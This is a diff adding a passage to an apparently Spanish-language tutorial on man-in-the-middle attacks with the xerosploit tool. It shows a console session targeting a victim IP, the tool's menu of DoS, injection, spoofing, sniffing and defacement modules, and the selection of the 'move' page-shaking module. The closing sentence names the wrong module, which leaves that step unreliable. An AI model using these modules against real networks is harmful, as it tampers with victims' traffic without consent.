@@ -3141,7 +3141,59 @@ página web, todas las imágenes serán sustituidas por la nuestra:
 
 #### Ataque Shaking Web
 
+Haciendo uso de la misma herramienta vista en el punto anterior, otra de las acciones de las que dispone
+**xerosploit** es el **move**, por el cual podemos hacer un ataque de tipo **Shaking Web**, es decir, hacer
+que cuando nuestra víctima navegue a una página, esta se mueva temblando de manera que no se logra leer nada
+de la misma:
 
+```bash
+Xero ➮ 192.168.1.60
+
+[++] 192.168.1.60 has been targeted. 
+
+[+] Which module do you want to load ? Enter 'help' for more information.
+
+Xero»modules ➮ help
+
+╔═════════╦══════════════════════════════════════════════════════════════════════╗
+║         ║                                                                      ║
+║         ║ pscan       :  Port Scanner                                          ║
+║         ║                                                                      ║
+║         ║ dos         :  DoS Attack                                            ║
+║         ║                                                                      ║
+║         ║ ping        :  Ping Request                                          ║
+║         ║                                                                      ║
+║         ║ injecthtml  :  Inject Html code                                      ║
+║         ║                                                                      ║
+║         ║ injectjs    :  Inject Javascript code                                ║
+║         ║                                                                      ║
+║         ║ rdownload   :  Replace files being downloaded                        ║
+║         ║                                                                      ║
+║         ║ sniff       :  Capturing information inside network packets          ║
+║ MODULES ║                                                                      ║
+║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
+║         ║                                                                      ║
+║         ║ yplay       :  Play background sound in target browser               ║
+║         ║                                                                      ║
+║         ║ replace     :  Replace all web pages images with your own one        ║
+║         ║                                                                      ║
+║         ║ driftnet    :  View all images requested by your targets             ║
+║         ║                                                                      ║
+║         ║ move        :  Shaking Web Browser content                           ║
+║         ║                                                                      ║
+║         ║ deface      :  Overwrite all web pages with your HTML code           ║
+║         ║                                                                      ║
+╚═════════╩══════════════════════════════════════════════════════════════════════╝
+
+[+] Which module do you want to load ? Enter 'help' for more information.
+
+Xero»modules ➮ move
+```
+
+Entre ellos, seleccionaremos la opción **replace**, que se encargará de llevar a cabo la sustitución de
+imágenes sobre la página web que nuestra víctima esté visitando:
+
+```bash
 
 
 
